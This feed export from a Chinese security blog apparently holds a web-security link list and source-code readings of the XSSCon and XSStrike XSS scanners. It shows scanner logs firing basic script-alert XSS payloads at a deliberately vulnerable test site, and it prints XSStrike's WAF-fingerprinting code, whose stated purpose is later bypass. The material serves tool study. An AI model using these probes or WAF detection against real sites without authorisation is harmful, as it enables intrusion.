<li><a href="https://github.com/tijme/not-your-average-web-crawler">not-your-average-web-crawler</a> 这是个很棒的爬虫框架.</li>
</ul>
]]></content>
      <categories>
        <category>SecurityTools</category>
      </categories>
      <tags>
        <tag>SecurityTools</tag>
      </tags>
  </entry>
  <entry>
    <title>WebSecurity Learning lib</title>
    <url>//39913.html</url>
    <content><![CDATA[<p><a href="https://www.kanxue.com/chm.htm">看雪知识库</a><br><a href="blog.nsfocus.net/web-vulnerability-analysis-coding-security/">【干货分享】Web安全漏洞深入分析及其安全编码</a></p>
<hr>
<h2 id="xss"><a href="#xss" class="headerlink" title="xss:"></a>xss:</h2><ul>
<li><a href="https://juejin.im/entry/58f43b0c61ff4b0058fd734d">跨站的艺术 - XSS Fuzzing 的技巧</a></li>
<li><a href="https://blog.csdn.net/he_and/article/details/84593067">XSStrike源码阅读（1）——目录结构与大体架构</a></li>
<li><a href="https://blog.csdn.net/he_and/article/details/84660755">XSStrike源码阅读（2）——四种模式</a></li>
<li><a href="https://blog.csdn.net/he_and/article/details/84886282">XSStrike源码阅读（3）——核心函数</a></li>
</ul>
<hr>
<h2 id="sqli"><a href="#sqli" class="headerlink" title="sqli:"></a>sqli:</h2><ul>
<li><a href="https://www.slideshare.net/stamparm/presentations">sqlmap作者ppt合集</a></li>
<li><a href="https://blog.csdn.net/wn314/article/details/78872828">Sqlmap中文手册</a></li>
<li><a href="http://www.cnblogs.com/hongfei/p/3872156.html">SQLMap用户手册【超详细】</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/43242220">sqlmap 内核分析 I: 基础流程</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/44157153">sqlmap 内核分析 II: 核心原理-页面相似度算法实践</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/45291193">sqlmap 内核分析 III: 核心逻辑</a></li>
<li><a href="https://x.hacking8.com/post-303.html">sqlmap 1.0源码解析</a></li>
<li><a href="https://wooyun.js.org/drops/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90Part1.%E6%B5%81%E7%A8%8B%E7%AF%87.html">SQLMAP源码分析Part1.流程篇</a></li>
<li><a href="https://www.cnblogs.com/zylq-blog/p/6797237.html">SQLMAP自动注入（二）</a></li>
<li><a href="https://wps2015.org/drops/drops/sqlmap%E6%94%AF%E6%8C%81%E8%87%AA%E5%8A%A8%E4%BC%AA%E9%9D%99%E6%80%81%E6%89%B9%E9%87%8F%E6%A3%80%E6%B5%8B.html">sqlmap支持自动伪静态批量检测</a></li>
<li><a href="http://www.wupco.cn/?p=1437">SQLMAP|阅读手记三{“三测”、开始注入}</a></li>
<li><a href="https://blog.csdn.net/u010516151/article/details/101905722">数据库注入方法和绕过技巧</a></li>
</ul>
<hr>
<h2 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan:"></a>port scan:</h2><ul>
<li><a href="https://cloud.tencent.com/developer/article/1180313">nmap使用指南（终极版）</a></li>
<li><a href="https://github.com/anvol/micro-honeypot/blob/master/honeypotd.c">micro-honeypot</a></li>
<li><a href="https://github.com/joeyism/C-Port-Scanner/blob/e5f6d414b8c9ece197e1f2941c041941d44458df/portscanner.c">C-Port-Scanner</a></li>
</ul>
<hr>
<h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破:"></a>爆破:</h2><ul>
<li><a href="https://blog.51cto.com/jzking121/1770605">Hydra使用说明——爆破神器</a></li>
</ul>
<hr>
<h2 id="Scanner"><a href="#Scanner" class="headerlink" title="Scanner:"></a>Scanner:</h2><ul>
<li><a href="https://chybeta.github.io/2019/01/04/WAScan%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/">WAScan源码阅读</a></li>
</ul>
<hr>
<h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析:"></a>日志分析:</h2><ul>
<li><a href="https://mp.weixin.qq.com/s/FzF0sx2geStPIc5VbskoGQ">日志分析系列(一):介绍篇</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&mid=2448904160&idx=1&sn=652e2bc0924230fbefc6fde80f64775f&scene=21#wechat_redirect">Web日志安全分析技巧</a></li>
</ul>
]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>Learning</tag>
      </tags>
  </entry>
  <entry>
    <title>XSScon源码-Simple XSS Scanner tool</title>
    <url>//28684.html</url>
    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p>同事在用<a href="https://github.com/menkrep1337/XSSCon">XSSCon</a>来测试xss漏洞,然后发现run不起来,然后我帮它debug了一下,顺手提了pr.</p>
<p>我稍微瞄了一下这个工具的xss scanner的代码,发现精简得很,所以看一看它源码.</p>
<hr>
<h1 id="检测效果"><a href="#检测效果" class="headerlink" title="检测效果:"></a>检测效果:</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__  ______ ____   ____</span><br><span class="line">\ \/ / ___/ ___| / ___|___  _ __</span><br><span class="line"> \  /\___ \___ \| |   / _ \| &#x27;_ \ &#123;v0.5 Final&#125;</span><br><span class="line"> /  \ ___) |__) | |__| (_) | | | | https://github.com/menkrep1337/XSSCon</span><br><span class="line">/_/\_\____/____/ \____\___/|_| |_|</span><br><span class="line">&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD</span><br><span class="line"></span><br><span class="line">[16:20:31] [INFO] Starting XSSCon...</span><br><span class="line">***************</span><br><span class="line">[16:20:31] [INFO] Checking connection to: http://testphp.vulnweb.com</span><br><span class="line">[16:20:32] [INFO] Connection estabilished 200</span><br><span class="line">[16:20:32] [WARNING] Target have form with POST method: http://testphp.vulnweb.com/search.php?test=query</span><br><span class="line">[16:20:32] [INFO] Collecting form input key.....</span><br><span class="line">[16:20:32] [INFO] Form key name: searchFor value: &lt;script&gt;console.log(5000/3000)&lt;/script&gt;</span><br><span class="line">[16:20:32] [INFO] Form key name: goButton value: &lt;Submit Confirm&gt;</span><br><span class="line">[16:20:32] [INFO] Sending payload (POST) method...</span><br><span class="line">[16:20:33] [CRITICAL] Detected XSS (POST) at http://testphp.vulnweb.com/search.php?test=query</span><br><span class="line">[16:20:33] [CRITICAL] Post data: &#123;&#x27;searchFor&#x27;: &#x27;&lt;script&gt;console.log(5000/3000)&lt;/script&gt;&#x27;, &#x27;goButton&#x27;: &#x27;goButton&#x27;&#125;</span><br><span class="line">***************</span><br><span class="line">[16:20:34] [INFO] Checking connection to: http://testphp.vulnweb.com/index.php</span><br><span class="line">[16:20:36] [INFO] Connection estabilished 200</span><br><span class="line">[16:20:36] [WARNING] Target have form with POST method: http://testphp.vulnweb.com/search.php?test=query</span><br><span class="line">[16:20:36] [INFO] Collecting form input key.....</span><br><span class="line">[16:20:36] [INFO] Form key name: searchFor value: &lt;script&gt;alert(6000/3000)&lt;/script&gt;</span><br><span class="line">[16:20:36] [INFO] Form key name: goButton value: &lt;Submit Confirm&gt;</span><br><span class="line">[16:20:36] [INFO] Sending payload (POST) method...</span><br><span class="line">[16:20:37] [CRITICAL] Detected XSS (POST) at http://testphp.vulnweb.com/search.php?test=query</span><br><span class="line">[16:20:37] [CRITICAL] Post data: &#123;&#x27;searchFor&#x27;: &#x27;&lt;script&gt;alert(6000/3000)&lt;/script&gt;&#x27;, &#x27;goButton&#x27;: &#x27;goButton&#x27;&#125;</span><br><span class="line">***************</span><br><span class="line">[16:20:39] [INFO] Checking connection to: http://testphp.vulnweb.com/categories.php</span><br><span class="line">[16:20:40] [INFO] Connection estabilished 200</span><br><span class="line">[16:20:40] [WARNING] Target have form with POST method: http://testphp.vulnweb.com/search.php?test=query</span><br><span class="line">[16:20:40] [INFO] Collecting form input key.....</span><br><span class="line">[16:20:40] [INFO] Form key name: searchFor value: &lt;script&gt;alert(6000/3000)&lt;/script&gt;</span><br><span class="line">[16:20:40] [INFO] Form key name: goButton value: &lt;Submit Confirm&gt;</span><br><span class="line">[16:20:40] [INFO] Sending payload (POST) method...</span><br><span class="line">[16:20:41] [CRITICAL] Detected XSS (POST) at http://testphp.vulnweb.com/search.php?test=query</span><br><span class="line">[16:20:41] [CRITICAL] Post data: &#123;&#x27;searchFor&#x27;: &#x27;&lt;script&gt;alert(6000/3000)&lt;/script&gt;&#x27;, &#x27;goButton&#x27;: &#x27;goButton&#x27;&#125;</span><br><span class="line">[16:20:41] [WARNING] Found link with query: cat=1 Maybe a vuln XSS point</span><br><span class="line">[16:20:41] [INFO] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=&lt;script&gt;alert(6000/3000)&lt;/script&gt;</span><br><span class="line">[16:20:41] [INFO] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Ealert%286000%2F3000%29%3C%2Fscript%3E</span><br><span class="line">[16:20:42] [CRITICAL] Detected XSS (GET) at http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Ealert(6000/3000)%3C/script%3E</span><br><span class="line">[16:20:42] [WARNING] Found link with query: cat=2 Maybe a vuln XSS point</span><br><span class="line">[16:20:42] [INFO] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=&lt;script&gt;alert(6000/3000)&lt;/script&gt;</span><br><span class="line">[16:20:42] [INFO] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Ealert%286000%2F3000%29%3C%2Fscript%3E</span><br><span class="line">[16:20:42] [CRITICAL] Detected XSS (GET) at http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Ealert(6000/3000)%3C/script%3E</span><br><span class="line">[16:20:42] [WARNING] Found link with query: cat=3 Maybe a vuln XSS point</span><br><span class="line">[16:20:42] [INFO] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=&lt;script&gt;alert(6000/3000)&lt;/script&gt;</span><br><span class="line">[16:20:42] [INFO] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Ealert%286000%2F3000%29%3C%2Fscript%3E</span><br><span class="line">[16:20:43] [CRITICAL] Detected XSS (GET) at http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Ealert(6000/3000)%3C/script%3E</span><br><span class="line">[16:20:43] [WARNING] Found link with query: cat=4 Maybe a vuln XSS point</span><br><span class="line">[16:20:43] [INFO] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=&lt;script&gt;alert(6000/3000)&lt;/script&gt;</span><br><span class="line">[16:20:43] [INFO] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Ealert%286000%2F3000%29%3C%2Fscript%3E</span><br><span class="line">[16:20:43] [CRITICAL] Detected XSS (GET) at http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Ealert(6000/3000)%3C/script%3E</span><br><span class="line">***************</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>省略了很多,通过输出可以大致了解一下他的流程。。</p>
<hr>
<h1 id="搭建靶机环境"><a href="#搭建靶机环境" class="headerlink" title="搭建靶机环境:"></a>搭建靶机环境:</h1><p>phpstudy + xss练习平台代码. 方便调试…</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.0.107/xss/level2.php</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2019/07/08/5d2329cfae51367657.png"></p>
<hr>
<h1 id="主要流程"><a href="#主要流程" class="headerlink" title="主要流程:"></a>主要流程:</h1><h2 id="命令行参数解析"><a href="#命令行参数解析" class="headerlink" title="命令行参数解析:"></a>命令行参数解析:</h2><p><img src="https://i.loli.net/2019/07/09/5d24ab505d76037106.png"></p>
<p>都是常规的一些参数,所以就略过.</p>
<p>可以看到里面含cralwer参数,可见是个带有爬虫功能的主动发包的scanner.</p>
<hr>
<h2 id="检查可用性"><a href="#检查可用性" class="headerlink" title="检查可用性:"></a>检查可用性:</h2><p><img src="https://i.loli.net/2019/07/09/5d24ac9d8fc6950212.png"></p>
<p>在开始探测之前,会检查一下该url的”连通性”.</p>
<p>作者本意是通过返回包的状态码<code>status_code</code>,认为大于400就是”连接失败”.</p>
<p>这里用<code>connection</code>应该是不准确的.</p>
<p><strong>有任一状态码都认为是服务器有回复,即是连通的.<br>连通性有问题的话,应该是请求超时,服务器无响应.</strong></p>
<p>所以,这里我觉得是检查该探测行为(xss检测)情况下,这个url的可用性.</p>
<p>xss检测的话,只要能正常访问页面,状态码是2xx或者3xx都是ok的.</p>
<p>而检测服务器报错的时候,状态码是5xx也是ok的。</p>
<p>检测服务器报错的时候常常是构造异常的url(数据包),服务器无法正常处理,然后报错,可能会把报错信息输出在页面上.</p>
<p>这种情况下,状态码一般都是<code>5xx</code>(大于400),那么是这个时候服务器是有响应的,有处理你的请求的,不能认为是连通性有问题.</p>
<p><strong>不同检测方式,判定url的可用性应该是不一样的</strong>。</p>
<hr>
<h2 id="三类请求的检测"><a href="#三类请求的检测" class="headerlink" title="三类请求的检测:"></a>三类请求的检测:</h2><h3 id="get-method"><a href="#get-method" class="headerlink" title="get_method:"></a>get_method:</h3><p>形式:get方法提交的键值对参数</p>
<p>例如:<code>xxx.com/index.php?id=1</code></p>
<p><img src="https://i.loli.net/2019/07/09/5d24b236456b846479.png"></p>
<p><img src="https://i.loli.net/2019/07/09/5d24b1cd0761e69063.png"></p>
<p>判断方式是看xss payload有没在返回包的源码中,简单粗暴但容易误报.</p>
<p>这里面还有个细节就是发了两次请求包.</p>
<p>为什么要发两次请求包呢?要多发个<code>urlencode</code>后的包呢?</p>
<p>因为有些特殊的字符要<code>urlencode</code>之后,服务器才能正常正确的处理.例如<code>&amp;</code>等.<br>之前在写api的时候,试过<code>token</code>值里面带了<code>&amp;</code>这个符号后,api程序不能正常解析,认为这是个不合法的<code>token</code>.</p>
<blockquote>
<p><strong>HTTP协议中参数组件的传输是<code>key=value</code>键值对的形式，如果要传输多个参数就需要用<code>&amp;</code>符号对键值对进行分隔。</strong>例如?name1&#x3D;value1&amp;name2&#x3D;$value2,这样在服务器收到这种字符串的时候，会用“&amp;”分隔出每一个参数，然后再用“&#x3D;”来分隔出参数值。</p>
</blockquote>
<blockquote>
<p>如果我的参数值中就包含<code>=</code>或者<code>&amp;</code>这样的特殊子字符的时候，该怎么办。比如说<code>name1=value1</code>,其中value1的值是<code>va&amp;lu=e1</code>，那么在传输过程中就会变成<code>name1=va&amp;lu=e1</code>。<strong>用户传输的本意是只有一个键值对，但是服务器端会解析成两个键值对，这样就自然的产生了歧义。</strong></p>
</blockquote>
<blockquote>
<p><strong>URL编码只是简单的在特殊字符的各个字节（16进制）前加上<code>%</code>即可。</strong>例如，我们对上述会产生歧义的字符进行编码后的结果：<code>name1=va%26lu%3D</code>，这样服务器会把紧跟在<code>%</code>后的字节当成普通的字节，不会把它当成各个参数或键值对的分隔符。</p>
</blockquote>
<hr>
<h3 id="get-method-form"><a href="#get-method-form" class="headerlink" title="get_method_form:"></a>get_method_form:</h3><p>form表单通过get方法提交.</p>
<p><img src="https://i.loli.net/2019/07/09/5d24b45770e6258699.png"><br><img src="https://i.loli.net/2019/07/09/5d24b4881707412169.png"></p>
<p>其中可以学到的点就是</p>
<p>构造请求包的思路:</p>
<ul>
<li>找到<code>form</code>标签</li>
<li>找出<code>input</code>,<code>textarea</code>属性,解析参数值对</li>
</ul>
<hr>
<h3 id="post-method："><a href="#post-method：" class="headerlink" title="post_method："></a>post_method：</h3><p>form表单通过post方法提交.</p>
<p><img src="https://i.loli.net/2019/07/09/5d24b528adc3c84990.png"></p>
<p>这个大体跟<code>get_method_form</code>相似.略过</p>
<hr>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h1><p>这个xss scanner代码量很少,只能算个简单的黑盒静态检测Xss的scanner,容易误报.</p>
<ul>
<li>代码虽少,但是可以通过这个工具简单的了解到一个黑盒静态检测的xss scanner是怎么写的,也是非常不错的哈哈哈.</li>
<li><strong>不同检测方式,判定url的可用性应该是不一样的</strong>。</li>
<li><strong>有任一状态码都认为是服务器有回复,即是连通的.连通性有问题的话,应该是请求超时,服务器无响应.</strong></li>
<li><strong>HTTP协议中参数组件的传输是<code>key=value</code>键值对的形式，如果要传输多个参数就需要用<code>&amp;</code>符号对键值对进行分隔。</strong>如果参数值中就包含<code>=</code>或者<code>&amp;</code>这样的特殊子字符的时候，<strong>用户传输的本意是只有一个键值对，但是服务器端会解析成两个键值对，这样就自然的产生了歧义。</strong>这个时候就要用URL编码,<strong>URL编码只是简单的在特殊字符的各个字节（16进制）前加上<code>%</code>即可。</strong></li>
</ul>
<blockquote>
<p>含注释的代码在<code>https://github.com/jerrychan807/XSSCon/tree/comment</code></p>
</blockquote>
<hr>
<h1 id="Refs"><a href="#Refs" class="headerlink" title="Refs:"></a>Refs:</h1><ul>
<li><a href="https://www.cnblogs.com/jerrysion/p/5522673.html">为什么要进行URL编码</a></li>
<li><a href="https://github.com/menkrep1337/XSSCon">XSSCon</a></li>
</ul>
]]></content>
      <categories>
        <category>SourceCodeReading</category>
      </categories>
      <tags>
        <tag>SourceCodeReading</tag>
      </tags>
  </entry>
  <entry>
    <title>XSStrike源码-waf检测</title>
    <url>//39308.html</url>
    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><blockquote>
<p>waf检测是为了之后的bypass.</p>
</blockquote>
<hr>
<h1 id="源码"><a href="#源码" class="headerlink" title="源码:"></a>源码:</h1><p>该功能比较简单,所以直接贴源码.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> core.requester <span class="keyword">import</span> requester</span><br><span class="line"><span class="keyword">from</span> core.log <span class="keyword">import</span> setup_logger</span><br><span class="line"></span><br><span class="line">logger = setup_logger(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wafDetector</span>(<span class="params">url, params, headers, GET, delay, timeout</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(sys.path[<span class="number">0</span>] + <span class="string">&#x27;/db/wafSignatures.json&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        wafSignatures = json.load(file)</span><br><span class="line">    <span class="comment"># a payload which is noisy enough to provoke the WAF</span></span><br><span class="line">    noise = <span class="string">&#x27;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&#x27;</span> <span class="comment"># 明显的payload</span></span><br><span class="line">    params[<span class="string">&#x27;xss&#x27;</span>] = noise</span><br><span class="line">    <span class="comment"># Opens the noise injected payload</span></span><br><span class="line">    response = requester(url, params, headers, GET, delay, timeout)</span><br><span class="line">    page = response.text <span class="comment"># 返回包源码</span></span><br><span class="line">    code = <span class="built_in">str</span>(response.status_code) <span class="comment"># 状态码</span></span><br><span class="line">    headers = <span class="built_in">str</span>(response.headers) <span class="comment"># 头部</span></span><br><span class="line">    logger.debug(<span class="string">&#x27;Waf Detector code: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(code))</span><br><span class="line">    logger.debug_json(<span class="string">&#x27;Waf Detector headers:&#x27;</span>, response.headers)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(code) &gt;= <span class="number">400</span>:</span><br><span class="line">        bestMatch = [<span class="number">0</span>, <span class="literal">None</span>]</span><br><span class="line">        <span class="keyword">for</span> wafName, wafSignature <span class="keyword">in</span> wafSignatures.items():</span><br><span class="line">            score = <span class="number">0</span></span><br><span class="line">            pageSign = wafSignature[<span class="string">&#x27;page&#x27;</span>]</span><br><span class="line">            codeSign = wafSignature[<span class="string">&#x27;code&#x27;</span>]</span><br><span class="line">            headersSign = wafSignature[<span class="string">&#x27;headers&#x27;</span>]</span><br><span class="line">            <span class="keyword">if</span> pageSign:</span><br><span class="line">                <span class="keyword">if</span> re.search(pageSign, page, re.I):</span><br><span class="line">                    score += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> codeSign:</span><br><span class="line">                <span class="keyword">if</span> re.search(codeSign, code, re.I):</span><br><span class="line">                    score += <span class="number">0.5</span>  <span class="comment"># increase the overall score by a smaller amount because http codes aren&#x27;t strong indicators         # 状态码权重较低,因为不是一个特别准确的判断标识</span></span><br><span class="line">            <span class="keyword">if</span> headersSign:</span><br><span class="line">                <span class="keyword">if</span> re.search(headersSign, headers, re.I):</span><br><span class="line">                    score += <span class="number">1</span></span><br><span class="line">            <span class="comment"># if the overall score of the waf is higher than the previous one</span></span><br><span class="line">            <span class="keyword">if</span> score &gt; bestMatch[<span class="number">0</span>]: <span class="comment"># 保留权重最高的</span></span><br><span class="line">                <span class="keyword">del</span> bestMatch[:]  <span class="comment"># delete the previous one</span></span><br><span class="line">                bestMatch.extend([score, wafName])  <span class="comment"># and add this one</span></span><br><span class="line">        <span class="keyword">if</span> bestMatch[<span class="number">0</span>] != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> bestMatch[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure>

<hr>
<h1 id="主要流程"><a href="#主要流程" class="headerlink" title="主要流程"></a>主要流程</h1><h2 id="发送明显的恶意payload"><a href="#发送明显的恶意payload" class="headerlink" title="发送明显的恶意payload:"></a>发送明显的恶意payload:</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># a payload which is noisy enough to provoke the WAF</span></span><br><span class="line">noise = <span class="string">&#x27;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&#x27;</span> <span class="comment"># 明显的payload</span></span><br><span class="line">params[<span class="string">&#x27;xss&#x27;</span>] = noise</span><br><span class="line"><span class="comment"># Opens the noise injected payload</span></span><br><span class="line">response = requester(url, params, headers, GET, delay, timeout)</span><br></pre></td></tr></table></figure>

<p>发送一段足够明显的xss payload,连参数名都是<code>xss</code>,试图触发server的waf机制.</p>
<hr>
<h2 id="判断逻辑"><a href="#判断逻辑" class="headerlink" title="判断逻辑:"></a>判断逻辑:</h2><p>通过3个指标来<strong>正则匹配</strong>并计算匹配度得分,然后保留一个得分最高的作为最终的判定结果</p>
<ol>
<li><strong>page 返回包源码</strong></li>
<li><strong>code 状态码</strong></li>
<li><strong>headers 返回包头部</strong></li>
</ol>
<hr>
<h3 id="正则匹配"><a href="#正则匹配" class="headerlink" title="正则匹配:"></a>正则匹配:</h3><p>目前这个版本有66种waf的指纹、特征.</p>
<p>详细请看.<code>https://github.com/s0md3v/XSStrike/blob/470f138db5fc0943e8a90a0de4052ddb7c03efab/db/wafSignatures.json</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">&quot;360 Web Application Firewall (360)&quot;</span> : &#123;</span><br><span class="line">		<span class="string">&quot;code&quot;</span> : <span class="string">&quot;493&quot;</span>,</span><br><span class="line">		<span class="string">&quot;page&quot;</span> : <span class="string">&quot;/wzws-waf-cgi/&quot;</span>,</span><br><span class="line">		<span class="string">&quot;headers&quot;</span> : <span class="string">&quot;X-Powered-By-360wzb&quot;</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="string">&quot;aeSecure&quot;</span> : &#123;</span><br><span class="line">		<span class="string">&quot;code&quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		<span class="string">&quot;page&quot;</span> : <span class="string">&quot;aesecure_denied.png&quot;</span>,</span><br><span class="line">		<span class="string">&quot;headers&quot;</span> : <span class="string">&quot;aeSecure-code&quot;</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="string">&quot;Airlock (Phion/Ergon)&quot;</span> : &#123;</span><br><span class="line">		<span class="string">&quot;code&quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		<span class="string">&quot;page&quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		<span class="string">&quot;headers&quot;</span> : <span class="string">&quot;AL[_-]?(SESS|LB)&quot;</span></span><br><span class="line">	&#125;,</span><br><span class="line">	.... 省略</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="计算匹配度分数"><a href="#计算匹配度分数" class="headerlink" title="计算匹配度分数:"></a>计算匹配度分数:</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> pageSign:</span><br><span class="line">    <span class="keyword">if</span> re.search(pageSign, page, re.I):</span><br><span class="line">        score += <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> codeSign:</span><br><span class="line">    <span class="keyword">if</span> re.search(codeSign, code, re.I):</span><br><span class="line">        score += <span class="number">0.5</span>  <span class="comment"># increase the overall score by a smaller amount because http codes aren&#x27;t strong indicators         # 状态码权重较低,因为不是一个特别准确的判断标识</span></span><br><span class="line"><span class="keyword">if</span> headersSign:</span><br><span class="line">    <span class="keyword">if</span> re.search(headersSign, headers, re.I):</span><br><span class="line">        score += <span class="number">1</span></span><br><span class="line"><span class="comment"># if the overall score of the waf is higher than the previous one</span></span><br><span class="line"><span class="keyword">if</span> score &gt; bestMatch[<span class="number">0</span>]: <span class="comment"># 保留权重最高的</span></span><br><span class="line">    <span class="keyword">del</span> bestMatch[:]  <span class="comment"># delete the previous one</span></span><br><span class="line">    bestMatch.extend([score, wafName])  <span class="comment"># and add this one</span></span><br></pre></td></tr></table></figure>


<p>分别在返回包源码,状态码,返回包头部里正则匹配.</p>
<p>其中状态码的得分(权重)最低,因为状态码不是一个特别准确的判断标识</p>
<p>然后保留一个得分最高的,作为最终结果.</p>
<hr>
]]></content>
      <categories>
        <category>SourceCodeReading</category>
      </categories>
      <tags>
        <tag>SourceCodeReading</tag>
      </tags>
  </entry>
  <entry>
    <title>XSStrike源码-潜在注入点检测</title>
    <url>//53126.html</url>
    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><hr>
<h1 id="潜在注入点检测"><a href="#潜在注入点检测" class="headerlink" title="潜在注入点检测:"></a>潜在注入点检测:</h1><blockquote>
<p>潜在注入的检测是<strong>判断输入点是否可以成功把数据注入到页面内容</strong></p>
<p>对于提交数据内容但是不输出到页面的输入点是没有必要进行Fuzzing的，因为即使可以提交攻击代码，也不会产生XSS；</p>
<p><strong>在潜在注入点的检测通常使用的是一个随机字符串</strong>，比如随机6位数字，再判断这6位数字是否返回输出在页面，以此来进行判断。</p>
<p>为什么不直接使用Payload进行判断呢？</p>
<p>因为Payload里包含了攻击代码，通常很多应用都有防火墙或者过滤机制，Payload中的关键词会被拦截导致提交失败或者不会返回输出在页面，但这种情况不代表不能XSS，因为有可能只是Payload不够好，没有绕过过滤或者其他安全机制</p>
<p><strong>所以采用无害的随机数字字符就可以避免这种情况产生，先验证可注入，再调整Payload去绕过过滤；而随机的目的在于不希望固定字符成为XSS防御黑名单里的关键词</strong>。</p>
<p>— <a href="https://juejin.im/entry/58f43b0c61ff4b0058fd734d">跨站的艺术 - XSS Fuzzing 的技巧</a></p>
</blockquote>
<hr>
<h1 id="流程"><a href="#流程" class="headerlink" title="流程:"></a>流程:</h1><h2 id="无害字符串替换"><a href="#无害字符串替换" class="headerlink" title="无害字符串替换:"></a>无害字符串替换:</h2><p>XSStrike采用的方式是用了作者自己的名字来作为特殊字符串.</p>
<blockquote>
<p>也相当于作者的一个banner信息..</p>
</blockquote>
<p><img src="https://i.loli.net/2019/07/16/5d2ca9b1c1b5d72584.png"></p>
<ul>
<li>以<code>v3dm0s</code>去替换参数值</li>
<li>发包请求,在返回包源码中搜索<code>v3dm0s</code></li>
<li>如果搜到多个地方有,那么说明可能存在多个输出点</li>
</ul>
<hr>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例:"></a>示例:</h3><p>有一个初始请求url:<code>http://192.168.0.104/xss/level1.php?name=test</code></p>
<p>将参数值<code>test</code>替换成<code>v3dm0s</code></p>
<p>替换后的请求url:<code>http://192.168.0.104/xss/level1.php?name=v3dm0s</code></p>
<p><img src="https://i.loli.net/2019/07/16/5d2caafb10c1587305.png"></p>
<p>那么说明这个页面有一个输出点.</p>
<hr>
<h3 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码:"></a>实现代码:</h3><p><img src="https://i.loli.net/2019/07/14/5d2b3fccaa40267676.png"></p>
<p>在解析完参数的前提下,进行替换.<br>然后调用<code>htmlParser</code>从返回包原文解析潜在注入点(输出点)的上下文环境.</p>
<hr>
<h2 id="解析输出点的上下文环境"><a href="#解析输出点的上下文环境" class="headerlink" title="解析输出点的上下文环境:"></a>解析输出点的上下文环境:</h2><p>每个输出点的环境都作为一个字典<code>occurences</code>存储.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="number">455</span>: &#123;<span class="string">&#x27;position&#x27;</span>: <span class="number">455</span>, <span class="string">&#x27;context&#x27;</span>: <span class="string">&#x27;attribute&#x27;</span>, <span class="string">&#x27;details&#x27;</span>: &#123;<span class="string">&#x27;tag&#x27;</span>: <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;value&#x27;</span>, <span class="string">&#x27;quote&#x27;</span>: <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;value&#x27;</span>: <span class="string">&#x27;v3dm0s&#x27;</span>, <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;value&#x27;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>position</code>:表示输出点在页面中的第几个字符处</li>
